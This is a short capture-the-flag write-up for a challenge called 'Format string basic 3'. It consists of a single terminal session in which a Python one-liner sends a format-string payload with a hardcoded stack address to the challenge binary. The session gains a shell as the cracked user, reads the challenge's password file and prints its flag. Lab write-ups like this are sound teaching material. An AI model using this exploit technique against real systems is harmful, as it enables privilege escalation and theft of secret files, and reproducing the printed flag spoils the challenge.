# Format string basic 3

## Writeup

```
app-systeme-ch17@challenge02:/tmp/17$ (python -c 'print "%117x" + "\xce\xfd\xff\xbf"' && cat -) | ~/ch17
Username: Bad username: %117x����
ls
a.out  ch17  ch17.c  genv.c
whoami
app-systeme-ch17-cracked
cat ~/.passwd
cat: '~/.passwd': No such file or directory
cat  /challenge/app-systeme/ch17/.passwd
f0rm4tm3B4by!
```